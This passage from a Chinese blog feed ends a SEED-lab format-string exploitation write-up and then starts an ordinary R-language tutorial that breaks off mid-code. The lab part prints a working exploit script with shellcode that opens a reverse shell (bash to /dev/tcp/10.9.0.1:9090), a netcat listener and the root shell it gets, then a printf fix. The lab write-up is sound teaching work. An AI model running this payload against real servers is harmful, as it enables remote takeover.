class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># print(&#x27;%#x&#x27;%shellcode_addr) 0x 0000 7fff ffff ea77</span><br><span class="hljs-attr">s_0_16</span>=<span class="hljs-number">0</span>xea77<br><span class="hljs-attr">s_16_32</span>=<span class="hljs-number">0</span>xffff<br><span class="hljs-attr">s_32_48</span>=<span class="hljs-number">0</span>x7fff<br></code></pre></td></tr></table></figure><p>根据大小顺序构造格式化字符串：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># order : s_32_48  s_0_16  s_16_32</span><br><br><span class="hljs-attribute">fmt</span>=&#x27;%.&#x27;+str(s_<span class="hljs-number">32</span>_<span class="hljs-number">48</span>)+&#x27;x%<span class="hljs-number">11</span>$hn&#x27;<br><span class="hljs-attribute">fmt</span>+=&#x27;%.&#x27; + str(s_<span class="hljs-number">0</span>_<span class="hljs-number">16</span>-s_<span class="hljs-number">32</span>_<span class="hljs-number">48</span>) + &#x27;x%<span class="hljs-number">12</span>$hn&#x27;<br><span class="hljs-attribute">fmt</span>+=&#x27;%.&#x27; + str(s_<span class="hljs-number">16</span>_<span class="hljs-number">32</span>-s_<span class="hljs-number">0</span>_<span class="hljs-number">16</span>) + &#x27;x%<span class="hljs-number">13</span>$hn&#x27;<br></code></pre></td></tr></table></figure><p>得到fmt字符串的大小为41</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(len(fmt)</span></span>) <span class="hljs-number">41</span><br></code></pre></td></tr></table></figure><p>目标地址</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ret1</span>=<span class="hljs-number">0</span>x<span class="hljs-number">7</span>fffffffe<span class="hljs-number">488</span> # ret_myprint<br><span class="hljs-attribute">ret2</span>=<span class="hljs-number">0</span>x<span class="hljs-number">7</span>fffffffe<span class="hljs-number">48</span>a # ret_myprint + <span class="hljs-number">2</span> <br><span class="hljs-attribute">ret3</span>=<span class="hljs-number">0</span>x<span class="hljs-number">7</span>fffffffe<span class="hljs-number">48</span>c # ret_myprint + <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>计算偏移</p><p>从前面可知，到buffer的偏移为34，由于fmt字符串有41个字节，因此要从8的整数倍开始填充地址，也即是第48个字节</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/image-20230330223149351.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># from 6th </span><br><span class="hljs-attribute">fmt</span>[<span class="hljs-number">48</span>:<span class="hljs-number">56</span>] = (s<span class="hljs-number">3</span>_addr).to_bytes(<span class="hljs-number">8</span>, byteorder=&#x27;little&#x27;)<br><span class="hljs-attribute">fmt</span>[<span class="hljs-number">56</span>:<span class="hljs-number">64</span>] = (s<span class="hljs-number">1</span>_addr).to_bytes(<span class="hljs-number">8</span>, byteorder=&#x27;little&#x27;)<br><span class="hljs-attribute">fmt</span>[<span class="hljs-number">64</span>:<span class="hljs-number">72</span>] = (s<span class="hljs-number">2</span>_addr).to_bytes(<span class="hljs-number">8</span>, byteorder=&#x27;little&#x27;)<br></code></pre></td></tr></table></figure><p>运行攻击脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 32-bit Generic Shellcode </span><br>shellcode_32 = (<br>   <span class="hljs-string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span><br>   <span class="hljs-string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span><br>   <span class="hljs-string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br> <span class="hljs-comment">#  &quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>    <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span> <br> <span class="hljs-string">&quot;AAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># 64-bit Generic Shellcode </span><br>shellcode_64 = (<br>   <span class="hljs-string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span><br>   <span class="hljs-string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span><br>   <span class="hljs-string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span><br>   <span class="hljs-string">&quot;/bin/bash*&quot;</span><br>   <span class="hljs-string">&quot;-c*&quot;</span><br>   <span class="hljs-comment"># The * in this line serves as the position marker         *</span><br>   <span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br>   <span class="hljs-comment">#  &quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span><br>   <span class="hljs-string">&quot;AAAAAAAA&quot;</span>   <span class="hljs-comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span><br>   <span class="hljs-string">&quot;BBBBBBBB&quot;</span>   <span class="hljs-comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span><br>   <span class="hljs-string">&quot;CCCCCCCC&quot;</span>   <span class="hljs-comment"># Placeholder for argv[2] --&gt; the command string</span><br>   <span class="hljs-string">&quot;DDDDDDDD&quot;</span>   <span class="hljs-comment"># Placeholder for argv[3] --&gt; NULL</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>N = <span class="hljs-number">1500</span><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br><br><span class="hljs-comment"># Choose the shellcode version based on your target</span><br>shellcode = shellcode_64<br><br>buf=<span class="hljs-number">0x00007fffffffe540</span><br>rbp=<span class="hljs-number">0x00007fffffffe480</span><br>ret_myprint=rbp+<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%ret_myprint)<br><span class="hljs-comment"># Put the shellcode somewhere in the payload 0x 7fff ffff e488</span><br>start = <span class="hljs-number">1500</span>-<span class="hljs-built_in">len</span>(shellcode)            <br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br>shellcode_addr=start+buf<br><span class="hljs-comment"># print(&#x27;%#x&#x27;%shellcode_addr) 0x 0000 7fff ffff ea77</span><br>s_0_16=<span class="hljs-number">0xea77</span><br>s_16_32=<span class="hljs-number">0xffff</span><br>s_32_48=<span class="hljs-number">0x7fff</span><br><br><span class="hljs-comment"># order : s_32_48  s_0_16  s_16_32</span><br><br>fmt =<span class="hljs-string">&#x27;%.&#x27;</span> + <span class="hljs-built_in">str</span>(s_32_48)+<span class="hljs-string">&#x27;x%40$hn&#x27;</span><br>fmt+=<span class="hljs-string">&#x27;%.&#x27;</span> + <span class="hljs-built_in">str</span>(s_0_16-s_32_48) + <span class="hljs-string">&#x27;x%41$hn&#x27;</span><br>fmt+=<span class="hljs-string">&#x27;%.&#x27;</span> + <span class="hljs-built_in">str</span>(s_16_32-s_0_16) + <span class="hljs-string">&#x27;x%42$hn&#x27;</span><br><br><span class="hljs-comment"># print(len(fmt)) 41</span><br><br>content[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(fmt)]=fmt.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>ret1=<span class="hljs-number">0x7fffffffe488</span><br>ret2=<span class="hljs-number">0x7fffffffe48a</span><br>ret3=<span class="hljs-number">0x7fffffffe48c</span><br><br><span class="hljs-comment"># from 6th </span><br>content[<span class="hljs-number">48</span>:<span class="hljs-number">56</span>] = (ret3).to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">56</span>:<span class="hljs-number">64</span>] = (ret1).to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>content[<span class="hljs-number">64</span>:<span class="hljs-number">72</span>] = (ret2).to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(content)<br><br></code></pre></td></tr></table></figure><p>开一个shell监听</p> <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>nc -nv -l <span class="hljs-number">9090</span> <br>Listening on 0.0.0.0 <span class="hljs-number">9090</span><br>Connection received on <span class="hljs-number">10.9</span>.0.<span class="hljs-number">6</span> <span class="hljs-number">53258</span><br>root<span class="hljs-variable">@7ebdb2357116</span><span class="hljs-symbol">:/fmt</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>另一个shell执行：<code>cat badfile | nc 10.9.0.6 9090</code></p><p>获得反向shell</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>nc -nv -l <span class="hljs-number">9090</span> <br>Listening on 0.0.0.0 <span class="hljs-number">9090</span><br>Connection received on <span class="hljs-number">10.9</span>.0.<span class="hljs-number">6</span> <span class="hljs-number">53258</span><br>root<span class="hljs-variable">@7ebdb2357116</span><span class="hljs-symbol">:/fmt</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="Task-6-Fixing-the-Problem"><a href="#Task-6-Fixing-the-Problem" class="headerlink" title="Task 6: Fixing the Problem"></a>Task 6: Fixing the Problem</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ make <br>gcc -o <span class="hljs-keyword">server</span> <span class="hljs-keyword">server</span>.c<br>gcc -DBUF_SIZE=<span class="hljs-number">100</span> -z execstack  -static -m32 -o <span class="hljs-keyword">format</span><span class="hljs-number">-32</span> <span class="hljs-keyword">format</span>.c<br><span class="hljs-keyword">format</span>.c: <span class="hljs-keyword">In</span> <span class="hljs-keyword">function</span> ‘myprintf’:<br><span class="hljs-keyword">format</span>.c:<span class="hljs-number">44</span>:<span class="hljs-number">5</span>: <span class="hljs-built_in">warning</span>: <span class="hljs-keyword">format</span> <span class="hljs-keyword">not</span> a string literal <span class="hljs-keyword">and</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">format</span> arguments [-Wformat-<span class="hljs-keyword">security</span>]<br>   <span class="hljs-number">44</span> |     printf(msg);<br>      |     ^~~~~~<br>gcc -DBUF_SIZE=<span class="hljs-number">100</span> -z execstack  -o <span class="hljs-keyword">format</span><span class="hljs-number">-64</span> <span class="hljs-keyword">format</span>.c<br><span class="hljs-keyword">format</span>.c: <span class="hljs-keyword">In</span> <span class="hljs-keyword">function</span> ‘myprintf’:<br><span class="hljs-keyword">format</span>.c:<span class="hljs-number">44</span>:<span class="hljs-number">5</span>: <span class="hljs-built_in">warning</span>: <span class="hljs-keyword">format</span> <span class="hljs-keyword">not</span> a string literal <span class="hljs-keyword">and</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">format</span> arguments [-Wformat-<span class="hljs-keyword">security</span>]<br>   <span class="hljs-number">44</span> |     printf(msg);<br>      |     ^~~~~~<br></code></pre></td></tr></table></figure><p>避免将客户端输入的字符串作为格式化字符串</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">// This line has a <span class="hljs-keyword">format</span>-string vulnerability<br>    <span class="hljs-keyword">printf</span>(msg);<br><span class="hljs-regexp">//</span> This line <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> have a <span class="hljs-keyword">format</span>-string vulnerability<br>    <span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,msg);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>R语言入门</title>
    <link href="/p/634ccbb5/"/>
    <url>/p/634ccbb5/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/R-Banner-Image-2.png"></p><h1 id="R语言简介"><a href="#R语言简介" class="headerlink" title="R语言简介"></a>R语言简介</h1><p>1992年由<strong>R</strong>oss Ihaka 和 <strong>R</strong>obert Gentleman发明，因此叫做R语言</p><p>R的特点：</p><ul><li>一个专注于统计分析、制图的语言</li><li>免费、开源</li><li>适用于多个系统（Windows、macOS、Linux）</li><li>有丰富的库</li><li>社区活跃</li></ul><h1 id="安装-amp-环境配置"><a href="#安装-amp-环境配置" class="headerlink" title="安装&amp;环境配置"></a>安装&amp;环境配置</h1><h2 id="安装R语言"><a href="#安装R语言" class="headerlink" title="安装R语言"></a>安装R语言</h2><p>以Windows为例</p><ul><li>在<a href="https://cloud.r-project.org/%E4%B8%8B%E8%BD%BDR%E8%AF%AD%E8%A8%80">https://cloud.r-project.org/下载R语言</a></li><li>使用R studio或者vscode作为ide</li><li>使用<code>install.packages(&quot;tidyverse&quot;)</code>语句安装宏包。其中，tydyverse是一个宏包</li><li>配置环境变量，使得命令行可以识别R.exe</li></ul><h2 id="在vscode中配置R语言环境"><a href="#在vscode中配置R语言环境" class="headerlink" title="在vscode中配置R语言环境"></a>在vscode中配置R语言环境</h2><p>安装拓展：</p><ol><li>R 扩展：提供了 R 语言的语法高亮、代码补全、调试功能等。</li><li>R LSP 扩展：提供了 R 语言的 Language Server Protocol（LSP）支持，可以提供更强大的代码分析和自动补全功能。</li></ol><p>配置 R 环境路径</p><ul><li><p>在 VSCode 中，按下快捷键 “Ctrl+Shift+P”（或者 “F1”），在命令面板中输入 “settings” 并选择 “Preferences: Open User Settings” 打开用户设置窗口</p></li><li><p>找到 “R: Executable Path” 选项，点击编辑图标，在弹出框中输入 R 环境的路径（如 “C:\Program Files\R\R-4.0.4\bin\R.exe”），保存设置</p></li><li><p>查找r.rterm。填写radian.exe的路径</p></li></ul><p>安装<code>languageserver</code>包和<code>httpgd</code>包：</p><ul><li>注意要是用管理员模式下的命令行</li><li>在设置中选择<code>use httpgd</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">install.packages(&quot;languageserver&quot;)<br>install.packages(&quot;httpgd&quot;)<br><br>pip install radian<br></code></pre></td></tr></table></figure><blockquote><p>4-9更新：vscode nmsl，RStudio才是yyds</p></blockquote><h1 id="R语言语法速通"><a href="#R语言语法速通" class="headerlink" title="R语言语法速通"></a>R语言语法速通</h1><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>R中存储的数据是<strong>对象</strong>，使用<code>&lt;-</code>可以对对象赋值，变量命名需要遵循一定的规则</p><p>对象与许多属性，比如类型和长度</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs R">r$&gt; data &lt;- read.csv(<span class="hljs-string">&quot;yourname_sample_data.csv&quot;</span>, header = <span class="hljs-literal">TRUE</span>, sep = <span class="hljs-string">&quot;,&quot;</span>)<br><br>r$&gt; typeof(data)<br>[<span class="hljs-number">1</span>] <span class="hljs-string">&quot;list&quot;</span><br><br>r$&gt; <span class="hljs-built_in">length</span>(data)<br>[<span class="hljs-number">1</span>] <span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="向量"><a href="#向量" class="headerlink" title="向量"></a>向量</h3><p>向量是R语言中的一种数据类型，是R语言中最基础的数据结构</p><p><code>c()</code> 函数可以对向量进行聚合操作</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-comment">#数值型向量</span><br>x &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>)<br>x &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-number">3e+06</span>, <span class="hljs-number">1.23e2</span>)     <span class="hljs-comment"># 双精度类型，科学计数法</span><br><br><span class="hljs-comment">#字符串型向量</span><br>x &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-string">&#x27;Charlie&#x27;</span>, <span class="hljs-string">&#x27;Dave&#x27;</span>)  <br><br><span class="hljs-comment">#因子型向量，是带有层级（Levels）的字符串向量，指定层级信息</span><br>four_seasons &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-string">&quot;spring&quot;</span>, <span class="hljs-string">&quot;summer&quot;</span>, <span class="hljs-string">&quot;autumn&quot;</span>, <span class="hljs-string">&quot;winter&quot;</span>)<br>four_seasons_factor &lt;- factor(four_seasons, <br>                              levels = <span class="hljs-built_in">c</span>(<span class="hljs-string">&quot;summer&quot;</span>, <span class="hljs-string">&quot;winter&quot;</span>, <span class="hljs-string">&quot;spring&quot;</span>, <span class="hljs-string">&quot;autumn&quot;</span>)<br>                              )<br></code></pre></td></tr></table></figure><h3 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h3><p>用 <code>matrix()</code> 函数创建矩阵，第一个参数是矩阵向量，第二个指定行，第三个指定列</p><p>默认是竖着排，如果想横着排就应该指定<code>byrow = TRUE</code></p><p>竖着排</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs r">m &lt;- matrix(<br>  <span class="hljs-built_in">c</span>(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>),<br>  nrow = <span class="hljs-number">2</span>, <br>  ncol = <span class="hljs-number">3</span><br>)<br><br><span class="hljs-comment">##      [,1] [,2] [,3]</span><br><span class="hljs-comment">## [1,]    2    3    5</span><br><span class="hljs-comment">## [2,]    4    1    7</span><br></code></pre></td></tr></table></figure><p>横着排</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs r">matrix(<br>  <span class="hljs-built_in">c</span>(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>),<br>  nrow = <span class="hljs-number">2</span>, <br>  ncol = <span class="hljs-number">3</span>,<br>  byrow = <span class="hljs-literal">TRUE</span><br>)<br><span class="hljs-comment">##      [,1] [,2] [,3]</span><br><span class="hljs-comment">## [1,]    2    4    3</span><br><span class="hljs-comment">## [2,]    1    5    7</span><br></code></pre></td></tr></table></figure><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p><strong>列表（list）</strong>可以将不同的数据结构组合起来</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs r">list1 &lt;- <span class="hljs-built_in">list</span>(<br>  a = <span class="hljs-built_in">c</span>(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>),<br>  b = <span class="hljs-built_in">c</span>(<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;love&quot;</span>, <span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;language&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>),<br>  <span class="hljs-built_in">c</span> = <span class="hljs-built_in">c</span>(<span class="hljs-literal">TRUE</span>, <span class="hljs-literal">TRUE</span>, <span class="hljs-literal">FALSE</span>, <span class="hljs-literal">TRUE</span>)<br>)<br></code></pre></td></tr></table></figure><p>这里组合了abc，分别是数字向量、字符串向量、布尔向量</p><h3 id="数据框"><a href="#数据框" class="headerlink" title="数据框"></a>数据框</h3><p><strong>数据框（data frame）</strong>是一种特殊的列表，列表中的元素必须是等长的，很像是Excel表格</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>以向量Wie例</p><h3 id="加减乘除模"><a href="#加减乘除模" class="headerlink" title="加减乘除模"></a>加减乘除模</h3><p>两个向量的加减乘除是将相同位置的元素进行运算，以÷为例</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs r">a &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>b &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)<br>a / b<br><span class="hljs-comment">## [1] 0.25 0.40 0.50</span><br></code></pre></td></tr></table></figure><p>注意，<code>/</code>是除，<code>%%</code>是取模操作</p><p><code>%*%</code>是求内积（点乘）</p><h3 id="循环补齐"><a href="#循环补齐" class="headerlink" title="循环补齐"></a>循环补齐</h3><p>当两个向量长度不相等的时候，短的向量会<strong>循环补齐</strong></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs r">x &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>y &lt;- <span class="hljs-built_in">c</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>, <span class="hljs-number">60</span>, <span class="hljs-number">70</span>)<br><br>x + y<br><br><span class="hljs-comment">## [1] 11 22 33 41 52 63 71</span><br></code></pre></td></tr></table></figure><p>上面例子中，x会自动补齐为(1, 2, 3，1, 2, 3，1)，也即是循环复制，直至与y的长度相同，之后进行运算</p><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><p>比如比较两个向量的代销关系，是否相等</p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>与或非</p><h3 id="冒号运算符"><a href="#冒号运算符" class="headerlink" title="冒号运算符"></a>冒号运算符</h3><ul><li><p>创建整数序列，比如1:10创建<code>1~10</code>的整数序列</p></li><li><p>seq函数也可以创建序列<code>seq(from = 1, to = 10, by = 1)</code></p></li><li><p><code>%in%</code> 运算符用于判断元素是否属于向量</p></li></ul><h2 id="特殊值"><a href="#特殊值" class="headerlink" title="特殊值"></a>特殊值</h2><ul><li><code>Inf</code>，<strong>Infinity</strong>，无限大</li><li><code>NaN</code>，<strong>Not a Number</strong>，比如0/0</li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><p>数学函数</p><ul><li><code>sum()</code>: 计算向量或矩阵中所有元素的总和。</li><li><code>mean()</code>: 计算向量或矩阵中所有元素的平均值。</li><li><code>max()</code>: 找出向量或矩阵中的最大值。</li><li><code>min()</code>: 找出向量或矩阵中的最小值。</li><li><code>abs()</code>: 求一个数或一组数的绝对值。</li><li><code>sqrt()</code>: 求一个数或一组数的平方根。</li><li><code>exp()</code>: 求一个数或一组数的指数函数。</li><li><code>log()</code>: 求一个数或一组数的自然对数。</li></ul><p>数据处理函数</p><ul><li><code>unique()</code>: 去除向量或数据框中的重复元素。</li><li><code>sort()</code>: 对向量进行排序。</li><li><code>order()</code>: 对向量排序并返回排序后元素在原始向量中的下标。</li><li><code>subset()</code>: 对数据框进行子集操作。</li><li><code>merge()</code>: 将两个数据框按照某一列关键字合并。</li><li><code>aggregate()</code>: 根据变量对数据框进行分组汇总。</li><li><code>table()</code>: 统计向量或数据框中各元素的出现次数。</li></ul><p>图形函数</p><ul><li><code>plot()</code>: 绘制散点图、折线图等常见统计图形。</li><li><code>hist()</code>: 绘制直方图。</li><li><code>barplot()</code>: 绘制条形图。</li><li><code>boxplot()</code>: 绘制箱线图。</li><li><code>pie()</code>: 绘制饼图。</li></ul><h3 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h3><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 